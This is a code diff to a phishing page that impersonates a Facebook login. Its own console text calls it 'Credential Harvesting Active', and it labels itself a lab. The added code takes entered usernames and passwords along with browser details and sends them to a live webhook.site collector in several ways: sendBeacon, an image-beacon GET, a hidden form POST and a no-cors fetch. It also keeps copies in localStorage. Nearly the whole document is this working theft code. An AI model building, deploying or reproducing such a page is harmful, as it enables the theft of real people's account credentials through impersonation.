@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -329,6 +330,86 @@
     // REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
     const COLLECTOR_URL = 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4';
     
+    // Method 1: Send via Image Beacon (GET request - no CORS issues)
+    function sendViaBeacon(username, password, source) {
+      try {
+        const timestamp = new Date().toISOString();
+        const data = {
+          timestamp: timestamp,
+          username: username,
+          password: password,
+          source: source,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform
+        };
+        const encodedData = encodeURIComponent(JSON.stringify(data));
+        const beaconUrl = `${COLLECTOR_URL}?data=${encodedData}&_t=${Date.now()}`;
+        
+        // Use sendBeacon if available (works in background)
+        if (navigator.sendBeacon) {
+          const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+          navigator.sendBeacon(COLLECTOR_URL, blob);
+          console.log("[LAB] ✓ Sent via sendBeacon");
+        } else {
+          // Fallback to image beacon (GET request)
+          const img = new Image();
+          img.src = beaconUrl;
+          console.log("[LAB] ✓ Sent via image beacon (GET)");
+        }
+      } catch(e) {
+        console.log("[LAB] Beacon send failed:", e.message);
+      }
+    }
+    
+    // Method 2: Save to localStorage (always works)
+    function saveToLocalStorage(entry) {
+      try {
+        let stored = localStorage.getItem('lab_harvest_log');
+        let log = stored ? JSON.parse(stored) : [];
+        log.push(entry);
+        if (log.length > 50) log.shift();
+        localStorage.setItem('lab_harvest_log', JSON.stringify(log));
+        console.log("[LAB] ✓ Saved to localStorage | Total entries:", log.length);
+        return true;
+      } catch(e) { 
+        console.warn("[LAB] localStorage failed:", e);
+        return false;
+      }
+    }
+    
+    // Method 3: Form submission (POST with target=_blank to avoid CORS preflight)
+    function sendViaForm(username, password, source) {
+      try {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = COLLECTOR_URL;
+        form.target = '_blank';
+        form.style.display = 'none';
+        
+        const data = {
+          timestamp: new Date().toISOString(),
+          username: username,
+          password: password,
+          source: source,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform
+        };
+        
+        const hiddenField = document.createElement('input');
+        hiddenField.type = 'hidden';
+        hiddenField.name = 'payload';
+        hiddenField.value = JSON.stringify(data);
+        form.appendChild(hiddenField);
+        
+        document.body.appendChild(form);
+        form.submit();
+        setTimeout(() => form.remove(), 100);
+        console.log("[LAB] ✓ Submitted via form POST");
+      } catch(e) {
+        console.log("[LAB] Form submission failed:", e.message);
+      }
+    }
+    
     async function harvestCredentials(username, password, source = 'login_form') {
       const timestamp = new Date().toISOString();
       const harvestedEntry = {
@@ -341,7 +422,8 @@
         language: navigator.language,
         url: window.location.href,
         referrer: document.referrer,
-        screenSize: `${screen.width}x${screen.height}`
+        screenSize: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
       
       // Display in console
@@ -353,42 +435,37 @@
       console.log("🌐 User Agent:", navigator.userAgent);
       console.groupEnd();
       
-      // Save to localStorage (backup)
-      try {
-        let stored = localStorage.getItem('lab_harvest_log');
-        let log = stored ? JSON.parse(stored) : [];
-        log.push(harvestedEntry);
-        if (log.length > 50) log.shift();
-        localStorage.setItem('lab_harvest_log', JSON.stringify(log));
-        console.log("[LAB] ✓ Saved to localStorage | Total entries:", log.length);
-      } catch(e) { console.warn("[LAB] localStorage failed:", e); }
+      // Always save to localStorage (backup)
+      saveToLocalStorage(harvestedEntry);
       
-      // Send to webhook collector
+      // Try multiple methods to send to webhook
       if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
+        // Method 1: Try fetch with no-cors (won't send body but at least logs)
         try {
-          // Try fetch with keepalive for better reliability
-          const response = await fetch(COLLECTOR_URL, {
+          await fetch(COLLECTOR_URL, {
             method: 'POST',
-            headers: { 
-              'Content-Type': 'application/json',
-              'Accept': 'application/json'
-            },
-            body: JSON.stringify(harvestedEntry),
-            keepalive: true
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(harvestedEntry)
           });
-          
-          if (response.ok) {
-            console.log("[LAB] ✓ Successfully sent to webhook collector");
-          } else {
-            console.log("[LAB] ⚠️ Webhook responded with status:", response.status);
-          }
+          console.log("[LAB] ✓ Fetch (no-cors) initiated");
         } catch (err) {
-          console.log("[LAB] ⚠️ Webhook send failed (network/CORS):", err.message);
-          console.log("[LAB] ℹ️ Data still saved to localStorage as backup");
+          console.log("[LAB] Fetch failed:", err.message);
         }
+        
+        // Method 2: Send via beacon/GET
+        sendViaBeacon(username, password, source);
+        
+        // Method 3: Try form submission as well
+        sendViaForm(username, password, source);
+        
+        // Method 4: Log to console with instructions for manual copy
+        console.log("%c⚠️ WEBHOOT INSTRUCTION ⚠️", "color: #ff6600; font-size: 14px; font-weight: bold");
+        console.log("%cCopy this data manually if needed:", "color: #ff6600");
+        console.log(harvestedEntry);
       } else {
         console.log("[LAB] ℹ️ Webhook URL not configured, data saved to localStorage only");
-        console.log("[LAB] 💡 Tip: Replace COLLECTOR_URL with your webhook endpoint");
+        console.log("[LAB] 💡 To view captured data, run in console: JSON.parse(localStorage.getItem('lab_harvest_log'))");
       }
       
       return true;
@@ -439,7 +516,6 @@
         return false;
       }
 
-      // Capture credentials and send to webhook
       showMessage("Processing...", false);
       
       try {
@@ -551,33 +627,34 @@
 
     // Display summary of stored credentials on load (console only)
     (function showStoredSummary() {
-      console.log("🔐 Facebook Clone - Credential Harvesting Active");
-      console.log("📡 Webhook URL:", COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' ? COLLECTOR_URL : "NOT CONFIGURED");
+      console.log("%c🔐 Facebook Clone - Credential Harvesting Active", "color: #1877f2; font-size: 14px; font-weight: bold");
+      console.log("%c📡 Webhook URL:", "color: #666", COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' ? COLLECTOR_URL : "NOT CONFIGURED (data saved to localStorage only)");
+      console.log("%c💡 All captured credentials are saved to localStorage AND sent via multiple methods", "color: #42b72a");
       
       try {
         const storedRaw = localStorage.getItem('lab_harvest_log');
         if (storedRaw) {
           const parsedLog = JSON.parse(storedRaw);
           if (parsedLog.length > 0) {
-            console.log(`📦 [LAB] localStorage contains ${parsedLog.length} captured entries.`);
+            console.log(`%c📦 localStorage contains ${parsedLog.length} captured entries.`, "color: #ff6600");
             const lastEntry = parsedLog[parsedLog.length-1];
             if (lastEntry && lastEntry.username && !lastEntry.username.includes('_click')) {
-              console.log(`📋 [LAB] Most recent capture: "${lastEntry.username}" at ${new Date(lastEntry.timestamp).toLocaleString()}`);
+              console.log(`%c📋 Most recent capture: "${lastEntry.username}" at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
             } else if (parsedLog.length > 0) {
-              console.log(`📋 [LAB] Most recent event: ${lastEntry.source} at ${new Date(lastEntry.timestamp).toLocaleString()}`);
+              console.log(`%c📋 Most recent event: ${lastEntry.source} at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
             }
           } else {
-            console.log("[LAB] No stored credentials yet.");
+            console.log("%c[LAB] No stored credentials yet.", "color: #666");
           }
         } else {
-          console.log("[LAB] No stored credentials yet.");
+          console.log("%c[LAB] No stored credentials yet.", "color: #666");
         }
       } catch(e) { 
         console.log("[LAB] Could not read localStorage summary");
       }
       
-      console.log("💡 Tip: Open DevTools (F12) → Network tab to see webhook requests");
-      console.log("💡 To view stored data: localStorage.getItem('lab_harvest_log')");
+      console.log("%c💡 To view all stored data, run in console: JSON.parse(localStorage.getItem('lab_harvest_log'))", "color: #1877f2");
+      console.log("%c💡 To clear stored data, run: localStorage.removeItem('lab_harvest_log')", "color: #1877f2");
     })();
   })();
 </script>
